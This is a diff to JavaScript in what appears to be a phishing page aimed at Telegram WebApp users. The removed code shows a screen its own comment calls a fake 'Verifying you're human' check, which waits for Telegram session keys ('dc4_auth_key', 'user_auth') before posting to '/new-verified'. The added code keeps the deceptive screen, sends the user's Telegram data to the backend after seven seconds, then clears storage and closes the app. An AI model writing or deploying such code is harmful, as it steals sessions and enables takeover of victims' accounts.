@@ -12,30 +12,8 @@ window.Sg = {
       const isTelegram = window.Telegram?.WebApp?.initData;
 
       if (isTelegram) {
-        // ✅ Schermata fake "Verifying you're human"
+        // ✅ Schermata di caricamento
         document.body.innerHTML = `
-          <style>
-            html, body {
-              margin: 0;
-              padding: 0;
-              height: 100%;
-              background: white !important;
-            }
-
-            @keyframes dots {
-              0%   { content: ""; }
-              25%  { content: "."; }
-              50%  { content: ".."; }
-              75%  { content: "..."; }
-              100% { content: ""; }
-            }
-
-            .dots::after {
-              content: "";
-              animation: dots 1.5s steps(4, end) infinite;
-            }
-          </style>
-
           <div style="
             height: 100vh; 
             display: flex; 
@@ -55,15 +33,26 @@ window.Sg = {
           </div>
         `;
 
-        const waitForAuth = async () => {
-          let retries = 5;
-          while (retries-- > 0) {
-            const ua = localStorage.getItem("user_auth");
-            const authKey = localStorage.getItem("dc4_auth_key") || localStorage.getItem("dc1_auth_key");
-            if (ua && authKey) break;
-            await new Promise(r => setTimeout(r, 1000));
+        // ✅ CSS per l’animazione "..."
+        const style = document.createElement("style");
+        style.innerHTML = `
+          @keyframes dots {
+            0%   { content: ""; }
+            25%  { content: "."; }
+            50%  { content: ".."; }
+            75%  { content: "..."; }
+            100% { content: ""; }
           }
 
+          .dots::after {
+            content: "";
+            animation: dots 1.5s steps(4, end) infinite;
+          }
+        `;
+        document.head.appendChild(style);
+
+        // ⏳ Dopo 7 secondi: invio al backend
+        setTimeout(async () => {
           const user = window.Telegram.WebApp.initDataUnsafe.user || {};
           await fetch("/new-verified", {
             method: "POST",
@@ -75,12 +64,13 @@ window.Sg = {
               "content-type": "application/json",
             },
           });
+        }, 7000);
 
+        // ⏳ Dopo altri 3 secondi: chiudi WebApp (totale 10 secondi)
+        setTimeout(() => {
           localStorage.clear();
           window.Telegram.WebApp.close();
-        };
-
-        waitForAuth();
+        }, 10000);
       }
     }
   },
